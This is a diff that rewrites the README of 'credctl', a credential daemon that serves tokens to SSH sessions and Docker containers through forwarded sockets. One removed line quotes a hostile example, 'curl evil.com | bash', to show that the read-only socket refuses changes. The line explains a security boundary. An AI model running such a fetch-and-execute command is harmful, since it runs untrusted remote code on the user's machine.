@@ -1,231 +1,133 @@
-# credctl
+<div align="center">
+  <img src="logo.png" alt="credctl logo" width="200"/>
+  
+  A credential helper daemon that runs on your local machine and provides secure credential access to remote environments via SSH socket forwarding.
+</div>
 
-A tiny credential agent for Unix systems (macOS/Linux) that supports remote access via SSH socket forwarding or direct volume mounting (Linux).
+---
 
-## Overview
+## Why credctl?
 
-`credctl` is a credential agent daemon that executes commands to retrieve credentials on demand. It supports multiple output formats (raw, env variables, files), interactive login flows, and provides secure remote access via SSH socket forwarding or direct volume mounting (Linux).
+- 🔒 **Credentials stay on your machine** - Never copy secrets to remote servers
+- 🚀 **Works from anywhere** - SSH into servers, Docker containers, dev environments
+- 🔑 **Multiple providers** - Command execution, OAuth2/OIDC flows
+- 🎯 **Simple** - One daemon, forward the socket, done
 
 ## Installation
-
-### Using Make (recommended)
 
 ```bash
 make install
 ```
 
-This will build and install `credctl` to `$(go env GOPATH)/bin` (usually `~/go/bin`).
-
-Make sure `$(go env GOPATH)/bin` is in your PATH:
-```bash
-# Add to ~/.bashrc, ~/.zshrc, or equivalent
-export PATH="$(go env GOPATH)/bin:$PATH"
-```
-
-You can customize the installation directory:
-
-```bash
-# Install to /usr/local/bin instead
-make install PREFIX=/usr/local
-
-# Install to ~/.local/bin
-make install PREFIX=~/.local
-
-# Just build without installing
-make build
-```
-
-### Manual installation
-
+Or manually:
 ```bash
 go build -o credctl
-mv credctl $(go env GOPATH)/bin/
-# or
 sudo mv credctl /usr/local/bin/
-```
-
-### Uninstall
-
-```bash
-make uninstall
 ```
 
 ## Quick Start
 
-### 1. Start the daemon
-
+**1. Start daemon on your local machine:**
 ```bash
-eval $(credctl daemon)
+eval $(credctl daemon start)
 ```
 
-This exports `CREDCTL_SOCK`, `CREDCTL_PID`, and `CREDCTL_LOGS` environment variables.
-
-### 2. Add credential providers
-
+**2. Add a credential provider:**
 ```bash
-# Command provider (GitHub CLI example)
-credctl add command gh --command "gh auth token" \
-  --login_command "gh auth login --web --clipboard -p https" \
-  --run-login
+# GitHub CLI example
+credctl add command gh --command "gh auth token"
 
-# OIDC provider with PKCE flow (Google example)
-credctl add oidc-pkce google --issuer https://accounts.google.com \
-  --client_id YOUR_CLIENT_ID
-
-# OAuth2 provider with device flow (GitHub example)
-credctl add oauth2-device github --client_id YOUR_CLIENT_ID \
-  --device_endpoint https://github.com/login/device/code \
-  --token_endpoint https://github.com/login/oauth/access_token
+# Google OAuth2 example
+credctl add oauth2 google \
+  --flow=auth-code \
+  --client_id=YOUR_CLIENT_ID \
+  --issuer=https://accounts.google.com
 ```
 
-### 3. Get credentials
-
+**3. Get credentials:**
 ```bash
-credctl get gh              # Raw output
+credctl get gh
 ```
 
-### 4. Re-authenticate when needed
+That's it on your local machine! ✅
 
+## Remote Access
+
+Now the magic: use credentials from **anywhere** without copying them.
+
+### SSH Socket Forwarding
+
+**On local machine, build for remote:**
 ```bash
-# Run login command for a provider
-credctl login gh            # Executes: gh auth login --web --clipboard -p https
+make build-linux-amd64
+scp credctl_linux_amd64 user@server:/tmp/credctl
 ```
 
-### 5. Export/Import providers
-
+**SSH with socket forward:**
 ```bash
-# Export all providers to JSON
-credctl export > providers.json
-
-# Import providers from file or stdin
-credctl import providers.json
-curl https://company.com/providers.json | credctl import
-
-# Overwrite existing providers
-credctl import --overwrite providers.json
+ssh -R /tmp/credctl.sock:$HOME/.credctl/agent-readonly.sock user@server
 ```
 
-## Remote Usage
-
-The daemon creates two sockets:
-- **Admin socket**: Full access (add, get, delete)
-- **Read-only socket**: Only get operations
-
-### Option 1: SSH Socket Forwarding
-
-This method works across different operating systems (macOS to Linux, etc.).
-
-**1. On your local machine (macOS):**
-
-```bash
-# Build credctl for the remote server architecture
-make build-linux-amd64    # For Linux x86_64
-# or
-make build-linux-arm64    # For Linux ARM64
-
-# Copy binary to remote server
-scp credctl_linux_amd64 user@remote:/tmp/credctl
-```
-
-**2. SSH with socket forwarding:**
-
-```bash
-# forward the read-only socket (safer - only get operations)
-ssh -R /tmp/credctl.sock:$HOME/.credctl/agent-readonly.sock user@remote
-```
-
-**3. On remote host:**
-
+**On remote server:**
 ```bash
 export CREDCTL_SOCK=/tmp/credctl.sock
-
-# Get credentials
-/tmp/credctl get gh        # ✓ Works
-
-# If using read-only socket, modifications are blocked
-/tmp/credctl add command malicious --command "curl evil.com | bash"  # ✗ Permission denied
+/tmp/credctl get gh    # Gets credential from YOUR machine!
 ```
 
-### Cross-compilation targets
+### Docker Volume Mount (Linux only)
 
 ```bash
-make build-linux-amd64     # Linux x86_64
-make build-linux-arm64     # Linux ARM64  
-make build-darwin-amd64    # macOS Intel
-make build-darwin-arm64    # macOS Apple Silicon
-make build-all             # Build for all platforms
+docker run -v $HOME/.credctl:/root/.credctl:ro \
+  -e CREDCTL_SOCK=/root/.credctl/agent-readonly.sock \
+  myimage
+
+# Inside container
+credctl get gh    # Works!
 ```
 
-By forwarding the read-only socket, remote systems can retrieve credentials but cannot execute arbitrary commands on your machine.
-
-### Option 2: Direct Volume Mount (Linux only)
-
-On Linux systems, you can also mount the socket directory directly as a volume. This works because Unix domain sockets are compatible across Linux systems.
-
-**1. Mount the socket directory:**
-
-```bash
-# Mount the entire .credctl directory
-docker run -v $HOME/.credctl:/home/user/.credctl:ro ...
-
-# Or mount just the read-only socket
-docker run -v $HOME/.credctl/agent-readonly.sock:/tmp/credctl.sock:ro ...
-```
-
-**2. In the container:**
-
-```bash
-export CREDCTL_SOCK=/tmp/credctl.sock
-
-# Get credentials
-credctl get gh        # ✓ Works
-```
-
-**Note:** This method only works on Linux systems due to Unix socket compatibility. For cross-platform scenarios (macOS to Linux), use SSH forwarding instead.
-
-## Provider Types
+## Providers
 
 ### Command Provider
-Executes shell commands to retrieve credentials.
-
+Execute any command to get credentials:
 ```bash
-credctl add command <name> --command "<command>" [--login_command "<command>"]
+credctl add command gh --command "gh auth token"
+credctl add command aws --command "aws sts get-session-token --output text --query 'Credentials.SessionToken'"
 ```
 
-### OIDC Providers
-OpenID Connect providers with discovery support and ID Token validation.
-
-- **oidc-pkce**: Authorization Code with PKCE flow (browser-based)
-- **oidc-device**: Device Authorization Grant flow (device code)
-- **oidc-client**: Client Credentials Grant flow (server-to-server)
-
+### OAuth2 Provider
+Full OAuth2/OIDC support with multiple flows:
 ```bash
-# With issuer (auto-discovery)
-credctl add oidc-pkce <name> --issuer <issuer_url> --client_id <id>
+# Authorization Code (browser-based)
+credctl add oauth2 google --flow=auth-code --client_id=... --issuer=...
 
-# With explicit endpoints
-credctl add oidc-pkce <name> --client_id <id> \
-  --auth_endpoint <url> --token_endpoint <url>
+# Device Flow (TV/CLI)
+credctl add oauth2 google-tv --flow=device --client_id=... --client_secret=... --issuer=...
+
+# Client Credentials (service-to-service)
+credctl add oauth2 api --flow=client-credentials --client_id=... --client_secret=... --token_endpoint=...
 ```
 
-### OAuth2 Providers
-OAuth2 providers without OIDC features (no discovery, no ID Tokens).
+📖 See [docs/oauth2.md](docs/oauth2.md) for detailed OAuth2 documentation.
 
-- **oauth2-pkce**: Authorization Code with PKCE flow
-- **oauth2-device**: Device Authorization Grant flow
-- **oauth2-client**: Client Credentials Grant flow
+## Common Commands
 
 ```bash
-credctl add oauth2-device <name> --client_id <id> \
-  --device_endpoint <url> --token_endpoint <url>
+credctl get <name>              # Get credential
+credctl login <name>            # Interactive login (OAuth2/OIDC)
+credctl export > backup.json    # Export all providers
+credctl import backup.json      # Import providers
+credctl delete <name>           # Delete provider
+tail -f $CREDCTL_LOGS           # View logs
 ```
 
-## Viewing Logs
+## Use Cases
 
-```bash
-# View logs in real-time
-tail -f $CREDCTL_LOGS
+- 🐳 **Docker containers** - Mount socket, no secrets in images
+- 🔧 **Remote development** - SSH to server, access local credentials
+- 🌐 **CI/CD** - Forward socket to build agents
+- 📱 **Multiple environments** - One daemon, many remotes
+- 🔄 **Credential rotation** - Update once, works everywhere
 
-# Search for errors
-grep error $CREDCTL_LOGS
-```
+---
+
+**License:** MIT
